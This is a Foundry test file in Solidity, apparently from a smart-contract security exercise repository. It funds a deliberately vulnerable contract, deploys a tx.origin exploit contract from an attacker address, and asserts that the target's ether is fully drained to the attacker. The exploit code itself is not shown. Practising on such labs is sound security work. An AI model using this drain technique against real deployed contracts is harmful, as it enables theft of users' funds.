// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "forge-std/Test.sol";
import "../src/hacks/Txorigin.sol";

contract CallMeMaybeTest is Test {
    CallMeMaybe public callMeMaybe;
    TxOriginExploit public exploit;
    address public attacker;

    function setUp() public {
        // Deploy the vulnerable contract
        callMeMaybe = new CallMeMaybe();

        // Set up the attacker address
        attacker = address(0xBEEF);

        // Give the attacker some ETH to perform the exploit
        vm.deal(attacker, 10 ether);
        
        // Fund the vulnerable contract with 10 ETH
        vm.deal(address(callMeMaybe), 10 ether);
    }

    function testTxOriginExploit() public {
        // Ensure the contract is funded
        assertEq(address(callMeMaybe).balance, 10 ether);

        // Deploy the exploit contract with attacker address and target vulnerable contract
        vm.startPrank(attacker);
        exploit = new TxOriginExploit{value: 1 ether}(payable(address(callMeMaybe)));
        vm.stopPrank();

        // After the attack, check that all funds have been drained
        assertEq(address(callMeMaybe).balance, 0);
        assertGt(attacker.balance, 10 ether);
    }
}

